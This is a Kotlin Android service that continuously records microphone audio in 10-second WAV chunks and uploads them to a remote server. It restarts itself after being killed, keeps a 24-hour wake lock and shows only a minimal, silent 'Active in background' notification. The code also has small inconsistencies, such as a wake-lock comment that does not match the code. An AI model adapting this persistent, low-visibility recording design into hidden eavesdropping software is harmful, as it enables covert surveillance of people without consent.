package com.audiostream.client

import android.app.Notification
import android.app.NotificationChannel
import android.app.NotificationManager
import android.app.PendingIntent
import android.app.Service
import android.content.Context
import android.content.Intent
import android.media.AudioFormat
import android.media.AudioRecord
import android.media.MediaRecorder
import android.os.Build
import android.os.IBinder
import android.os.PowerManager
import androidx.core.app.NotificationCompat
import kotlinx.coroutines.*
import java.io.File
import java.io.FileOutputStream
import java.io.RandomAccessFile
import java.nio.ByteBuffer
import java.nio.ByteOrder
import java.security.MessageDigest
import java.text.SimpleDateFormat
import java.util.*
import java.util.concurrent.atomic.AtomicBoolean

/**
 * AudioRecordService.kt — Foreground service for continuous audio recording.
 *
 * This is the heart of the system. It:
 *   1. Records audio continuously via AudioRecord (16kHz, 16-bit, Mono)
 *   2. Splits recordings into WAV chunks (default 10 seconds)
 *   3. Saves each chunk locally with UUID, timestamp, checksum
 *   4. Enqueues chunks for upload via UploadManager
 *   5. Continues recording regardless of network/upload status
 *   6. Updates the foreground notification with live stats
 *
 * CRITICAL GUARANTEE: Recording NEVER stops due to network issues.
 * The recording loop and upload loop are completely independent.
 */

class AudioRecordService : Service() {

    companion object {
        const val ACTION_START = "ACTION_START"
        const val ACTION_STOP = "ACTION_STOP"
        const val ACTION_STATE_UPDATE = "ACTION_STATE_UPDATE"
        const val ACTION_LOG = "ACTION_LOG"

        const val EXTRA_SERVER_URL = "server_url"
        const val EXTRA_PENDING = "pending"
        const val EXTRA_RETRIES = "retries"
        const val EXTRA_DURATION = "duration"
        const val EXTRA_CONNECTION = "connection"
        const val EXTRA_MESSAGE = "message"
        const val EXTRA_STORAGE = "storage"

        const val CHANNEL_ID = "audio_monitor_channel"
        const val NOTIFICATION_ID = 1

        // Audio format (must match server: 16kHz, Mono, 16-bit PCM)
        const val SAMPLE_RATE = 16000
        const val CHANNEL_CONFIG = AudioFormat.CHANNEL_IN_MONO
        const val AUDIO_FORMAT = AudioFormat.ENCODING_PCM_16BIT
        const val BYTES_PER_SAMPLE = 2
        const val BYTE_RATE = SAMPLE_RATE * BYTES_PER_SAMPLE  // 32000 bytes/sec

        // Default chunk duration
        const val DEFAULT_CHUNK_SECONDS = 10

        // Keep track of running state
        @Volatile
        var isRunning = false
            private set
    }

    // Recording
    private var audioRecord: AudioRecord? = null
    private val isRecording = AtomicBoolean(false)
    private var recordingThread: Thread? = null
    private var chunkDurationSeconds = DEFAULT_CHUNK_SECONDS
    private var totalRecordingSeconds = 0L

    // Managers
    private var uploadManager: UploadManager? = null
    private var connectionMonitor: ConnectionMonitor? = null
    private var storageManager: StorageManager? = null

    // System
    private var wakeLock: PowerManager.WakeLock? = null
    private val serviceScope = CoroutineScope(Dispatchers.IO + SupervisorJob())

    // Config
    private var serverUrl = ""
    private var clientName = ""
    private var deviceInfo = ""

    // Stats for notification
    private var pendingUploads = 0
    private var totalRetries = 0
    private var connectionState = "Idle"

    override fun onBind(intent: Intent?): IBinder? = null

    override fun onStartCommand(intent: Intent?, flags: Int, startId: Int): Int {
        if (intent == null) {
            // Android OS restarted the service after process termination (START_STICKY)
            val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
            val wasRunning = prefs.getBoolean("was_running", false)
            val savedUrl = prefs.getString("server_url", null)
            if (wasRunning && !savedUrl.isNullOrEmpty()) {
                startMonitoring(savedUrl)
            }
        } else {
            when (intent.action) {
                ACTION_START -> {
                    val url = intent.getStringExtra(EXTRA_SERVER_URL) ?: return START_NOT_STICKY
                    startMonitoring(url)
                }
                ACTION_STOP -> {
                    stopMonitoring()
                }
            }
        }
        // START_STICKY ensures Android restarts the service if killed
        return START_STICKY
    }

    override fun onDestroy() {
        super.onDestroy()
        stopMonitoring()
    }

    // ══════════════════════════════════════════════════════════════════════
    // SERVICE LIFECYCLE
    // ══════════════════════════════════════════════════════════════════════

    private fun startMonitoring(url: String) {
        if (isRunning) return

        serverUrl = url

        // Generate client name from device info
        clientName = generateClientName()
        deviceInfo = "${Build.MANUFACTURER} ${Build.MODEL} (Android ${Build.VERSION.RELEASE})"

        // 1. Create notification channel and start foreground
        createNotificationChannel()
        startForeground(NOTIFICATION_ID, buildNotification("Starting..."))

        // 2. Acquire wake lock (4 hour max, renewed on each chunk)
        acquireWakeLock()

        // 3. Initialize managers
        storageManager = StorageManager(this)

        connectionMonitor = ConnectionMonitor(
            context = this,
            serverUrl = serverUrl,
            onStateChange = { state -> onConnectionStateChanged(state) },
            onLog = { msg -> sendLog(msg) }
        )

        uploadManager = UploadManager(
            context = this,
            serverUrl = serverUrl,
            clientName = clientName,
            deviceInfo = deviceInfo,
            connectionMonitor = connectionMonitor!!,
            storageManager = storageManager!!,
            onLog = { msg -> sendLog(msg) },
            onStatsUpdate = { pending, retries -> onUploadStatsUpdate(pending, retries) }
        )

        // 4. Start everything
        isRunning = true
        connectionMonitor!!.start()
        uploadManager!!.start()
        startRecording()

        // 5. Clean up any temp files from previous sessions
        storageManager!!.cleanupTempFiles()

        // 6. Start notification update loop
        startNotificationUpdater()

        sendLog("Service started. Client: $clientName")
        sendLog("Server: $serverUrl")
        sendLog("Chunk duration: ${chunkDurationSeconds}s")
        broadcastStateUpdate()
    }

    private fun stopMonitoring() {
        if (!isRunning) return
        isRunning = false

        sendLog("Stopping service...")

        // Stop recording flag and release AudioRecord FIRST to unblock read() call immediately
        isRecording.set(false)
        try {
            audioRecord?.stop()
            audioRecord?.release()
            audioRecord = null
        } catch (e: Exception) { /* ignore */ }

        // Join recording thread asynchronously in background so Main thread never lags
        val threadToJoin = recordingThread
        recordingThread = null
        serviceScope.launch(Dispatchers.IO) {
            try {
                threadToJoin?.interrupt()
                threadToJoin?.join(1000)
            } catch (e: Exception) { /* ignore */ }
        }

        // Stop managers
        uploadManager?.stop()
        connectionMonitor?.stop()

        // Release wake lock
        releaseWakeLock()

        // Cancel coroutines after cleanup
        serviceScope.coroutineContext.cancelChildren()

        // Stop foreground
        stopForeground(STOP_FOREGROUND_REMOVE)
        stopSelf()

        sendLog("Service stopped")
        broadcastStateUpdate()
    }

    // ══════════════════════════════════════════════════════════════════════
    // AUDIO RECORDING
    // ══════════════════════════════════════════════════════════════════════

    private fun startRecording() {
        try {
            val minBuf = AudioRecord.getMinBufferSize(SAMPLE_RATE, CHANNEL_CONFIG, AUDIO_FORMAT)
            val bufferSize = maxOf(minBuf, 4096)

            audioRecord = AudioRecord(
                MediaRecorder.AudioSource.MIC,
                SAMPLE_RATE,
                CHANNEL_CONFIG,
                AUDIO_FORMAT,
                bufferSize
            )

            if (audioRecord?.state != AudioRecord.STATE_INITIALIZED) {
                sendLog("ERROR: Failed to initialize AudioRecord. Microphone in use?")
                stopMonitoring()
                return
            }

            isRecording.set(true)
            audioRecord!!.startRecording()

            recordingThread = Thread({
                recordingLoop()
            }, "AudioRecordThread").apply {
                priority = Thread.MAX_PRIORITY
                start()
            }

            sendLog("Recording started (16kHz, Mono, 16-bit)")

        } catch (e: SecurityException) {
            sendLog("ERROR: Microphone permission denied")
            stopMonitoring()
        } catch (e: Exception) {
            sendLog("ERROR: Recording init failed: ${e.message}")
            stopMonitoring()
        }
    }

    /**
     * Main recording loop — runs on a dedicated thread.
     *
     * Continuously records audio and splits into WAV chunks.
     * This loop NEVER stops for network issues — it only cares
     * about the microphone and local storage.
     */
    private fun recordingLoop() {
        val chunkBytes = BYTE_RATE * chunkDurationSeconds  // bytes per chunk
        val readBuffer = ByteArray(4096)
        var chunkBuffer = ByteArray(chunkBytes)
        var chunkPos = 0

        sendLog("Recording loop started (chunk size: ${chunkBytes / 1024} KB)")

        while (isRecording.get() && !Thread.interrupted()) {
            try {
                val bytesRead = audioRecord?.read(readBuffer, 0, readBuffer.size) ?: -1

                if (bytesRead > 0) {
                    // Copy bytes into chunk buffer
                    val bytesToCopy = minOf(bytesRead, chunkBytes - chunkPos)
                    System.arraycopy(readBuffer, 0, chunkBuffer, chunkPos, bytesToCopy)
                    chunkPos += bytesToCopy

                    // Check if chunk is full
                    if (chunkPos >= chunkBytes) {
                        // Save this chunk
                        saveChunk(chunkBuffer, chunkPos)
                        totalRecordingSeconds += chunkDurationSeconds

                        // Start new chunk
                        chunkBuffer = ByteArray(chunkBytes)
                        chunkPos = 0

                        // If there were extra bytes, copy them to new chunk
                        if (bytesToCopy < bytesRead) {
                            val remaining = bytesRead - bytesToCopy
                            System.arraycopy(readBuffer, bytesToCopy, chunkBuffer, 0, remaining)
                            chunkPos = remaining
                        }

                        // Check storage health
                        checkStorage()
                    }
                } else if (bytesRead < 0) {
                    sendLog("AudioRecord read error: $bytesRead")
                    // Try to recover by waiting briefly
                    Thread.sleep(100)
                }

            } catch (e: InterruptedException) {
                // Service is stopping — save any partial chunk
                if (chunkPos > 0) {
                    sendLog("Saving partial chunk ($chunkPos bytes)")
                    saveChunk(chunkBuffer, chunkPos)
                }
                break
            } catch (e: Exception) {
                sendLog("Recording error: ${e.message}")
                Thread.sleep(500)
            }
        }

        // Save any remaining data in buffer
        if (chunkPos > 0 && isRecording.get()) {
            saveChunk(chunkBuffer, chunkPos)
        }

        sendLog("Recording loop ended")
    }

    // ══════════════════════════════════════════════════════════════════════
    // CHUNK SAVING
    // ══════════════════════════════════════════════════════════════════════

    /**
     * Save a PCM buffer as a complete WAV file and enqueue for upload.
     */
    private fun saveChunk(pcmData: ByteArray, dataSize: Int) {
        try {
            val uuid = UUID.randomUUID().toString()
            val timestamp = SimpleDateFormat("yyyy-MM-dd'T'HH:mm:ss", Locale.US).format(Date())
            val duration = dataSize.toDouble() / BYTE_RATE

            // Create WAV file
            val chunksDir = storageManager?.getChunksDirectory() ?: return
            val wavFile = File(chunksDir, "chunk_${System.currentTimeMillis()}.wav")

            // Write WAV header + PCM data
            FileOutputStream(wavFile).use { fos ->
                fos.write(buildWavHeader(dataSize))
                fos.write(pcmData, 0, dataSize)
                fos.flush()
                fos.fd.sync()  // Force write to disk
            }

            // Compute checksum
            val checksum = computeSha256(wavFile)

            // Create chunk record
            val chunk = AudioChunk(
                uuid = uuid,
                filePath = wavFile.absolutePath,
                timestamp = timestamp,
                duration = duration,
                fileSize = wavFile.length(),
                checksum = checksum
            )

            // Enqueue for upload (runs on coroutine)
            serviceScope.launch {
                uploadManager?.enqueueChunk(chunk)
            }

        } catch (e: Exception) {
            sendLog("ERROR saving chunk: ${e.message}")
        }
    }

    /**
     * Build a 44-byte WAV file header for PCM data.
     */
    private fun buildWavHeader(dataSize: Int): ByteArray {
        val totalSize = dataSize + 36  // RIFF chunk size (file size - 8)

        return ByteBuffer.allocate(44).apply {
            order(ByteOrder.LITTLE_ENDIAN)
            // RIFF header
            put("RIFF".toByteArray())
            putInt(totalSize)
            put("WAVE".toByteArray())
            // fmt chunk
            put("fmt ".toByteArray())
            putInt(16)                  // Chunk size
            putShort(1)                 // PCM format
            putShort(1)                 // Mono
            putInt(SAMPLE_RATE)         // Sample rate
            putInt(BYTE_RATE)           // Byte rate
            putShort(BYTES_PER_SAMPLE.toShort())  // Block align
            putShort(16)                // Bits per sample
            // data chunk
            put("data".toByteArray())
            putInt(dataSize)
        }.array()
    }

    /**
     * Compute SHA-256 checksum of a file.
     */
    private fun computeSha256(file: File): String {
        val digest = MessageDigest.getInstance("SHA-256")
        file.inputStream().use { input ->
            val buffer = ByteArray(8192)
            var read: Int
            while (input.read(buffer).also { read = it } != -1) {
                digest.update(buffer, 0, read)
            }
        }
        return digest.digest().joinToString("") { "%02x".format(it) }
    }

    // ══════════════════════════════════════════════════════════════════════
    // STORAGE HEALTH
    // ══════════════════════════════════════════════════════════════════════

    private fun checkStorage() {
        val health = storageManager?.checkStorageHealth() ?: "ok"
        when (health) {
            "critical" -> sendLog("⚠️ CRITICAL: Storage very low! < 100 MB free")
            "warning" -> sendLog("⚠️ Storage low: < 500 MB free")
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // CLIENT NAME GENERATION
    // ══════════════════════════════════════════════════════════════════════

    private fun generateClientName(): String {
        // Check if we have a saved name
        val prefs = getSharedPreferences("AudioMonitorPrefs", Context.MODE_PRIVATE)
        val saved = prefs.getString("client_name", null)
        if (saved != null) return saved

        // Generate from device info
        val manufacturer = Build.MANUFACTURER.replaceFirstChar { it.uppercase() }
        val model = Build.MODEL.replace(" ", "-")
        val name = "$manufacturer-$model"

        // Save for future use
        prefs.edit().putString("client_name", name).apply()
        return name
    }

    // ══════════════════════════════════════════════════════════════════════
    // CALLBACKS
    // ══════════════════════════════════════════════════════════════════════

    private fun onConnectionStateChanged(state: ConnectionState) {
        connectionState = when (state) {
            ConnectionState.CONNECTED -> "Connected"
            ConnectionState.DISCONNECTED -> "Disconnected"
            ConnectionState.RECONNECTING -> "Reconnecting"
            ConnectionState.WAITING -> "Waiting"
            ConnectionState.CONNECTING -> "Connecting"
            ConnectionState.ERROR -> "Error"
            ConnectionState.STOPPED -> "Stopped"
            ConnectionState.IDLE -> "Idle"
        }
        broadcastStateUpdate()
        updateNotification()
    }

    private fun onUploadStatsUpdate(pending: Int, retries: Int) {
        pendingUploads = pending
        totalRetries = retries
        broadcastStateUpdate()
        updateNotification()
    }

    // ══════════════════════════════════════════════════════════════════════
    // NOTIFICATIONS
    // ══════════════════════════════════════════════════════════════════════

    private fun createNotificationChannel() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val channel = NotificationChannel(
                CHANNEL_ID,
                "Audio Monitor",
                NotificationManager.IMPORTANCE_MIN
            ).apply {
                description = "Continuous audio recording and upload service"
                setShowBadge(false)
                setSound(null, null)
                enableVibration(false)
            }
            val manager = getSystemService(NotificationManager::class.java)
            manager.createNotificationChannel(channel)
        }
    }

    private fun buildNotification(status: String): Notification {
        val intent = Intent(this, MainActivity::class.java)
        val pendingIntent = PendingIntent.getActivity(
            this, 0, intent, PendingIntent.FLAG_IMMUTABLE
        )

        // Stop action
        val stopIntent = Intent(this, AudioRecordService::class.java).apply {
            action = ACTION_STOP
        }
        val stopPendingIntent = PendingIntent.getService(
            this, 1, stopIntent, PendingIntent.FLAG_IMMUTABLE
        )

        return NotificationCompat.Builder(this, CHANNEL_ID)
            .setContentTitle("Audio Monitor")
            .setContentText("Active in background")
            .setSmallIcon(android.R.drawable.ic_btn_speak_now)
            .setPriority(NotificationCompat.PRIORITY_MIN)
            .setContentIntent(pendingIntent)
            .addAction(android.R.drawable.ic_media_pause, "Stop", stopPendingIntent)
            .setOngoing(true)
            .setSilent(true)
            .build()
    }

    private fun updateNotification() {
        if (!isRunning) return
        try {
            val manager = getSystemService(NotificationManager::class.java)
            manager.notify(NOTIFICATION_ID, buildNotification(connectionState))
        } catch (e: Exception) {
            // Non-critical
        }
    }

    private var notificationUpdaterJob: Job? = null

    private fun startNotificationUpdater() {
        notificationUpdaterJob = serviceScope.launch {
            while (isActive && isRunning) {
                delay(1000)  // Broadcast live stats to in-app UI every second
                totalRecordingSeconds++
                withContext(Dispatchers.Main) {
                    broadcastStateUpdate()
                }
            }
        }
    }

    // ══════════════════════════════════════════════════════════════════════
    // BROADCASTS TO UI
    // ══════════════════════════════════════════════════════════════════════

    private fun broadcastStateUpdate() {
        val intent = Intent(ACTION_STATE_UPDATE).apply {
            putExtra(EXTRA_PENDING, pendingUploads)
            putExtra(EXTRA_RETRIES, totalRetries)
            putExtra(EXTRA_DURATION, totalRecordingSeconds)
            putExtra(EXTRA_CONNECTION, connectionState)
            putExtra(EXTRA_STORAGE, storageManager?.getStorageSummary() ?: "")
        }
        sendBroadcast(intent)
    }

    private fun sendLog(message: String) {
        val intent = Intent(ACTION_LOG).apply {
            putExtra(EXTRA_MESSAGE, message)
        }
        sendBroadcast(intent)
    }

    // ══════════════════════════════════════════════════════════════════════
    // WAKE LOCK
    // ══════════════════════════════════════════════════════════════════════

    private fun acquireWakeLock() {
        val pm = getSystemService(Context.POWER_SERVICE) as PowerManager
        wakeLock = pm.newWakeLock(
            PowerManager.PARTIAL_WAKE_LOCK,
            "AudioMonitor::RecordingWakelock"
        ).apply {
            setReferenceCounted(false)
            acquire(24 * 60 * 60 * 1000L)  // 24 hours CPU hold
        }
    }

    private fun releaseWakeLock() {
        try {
            if (wakeLock?.isHeld == true) {
                wakeLock?.release()
            }
        } catch (e: Exception) { /* ignore */ }
        wakeLock = null
    }

    // ══════════════════════════════════════════════════════════════════════
    // HELPERS
    // ══════════════════════════════════════════════════════════════════════

    private fun formatDuration(seconds: Long): String {
        val h = seconds / 3600
        val m = (seconds % 3600) / 60
        val s = seconds % 60
        return if (h > 0) String.format("%02d:%02d:%02d", h, m, s)
        else String.format("%02d:%02d", m, s)
    }
}
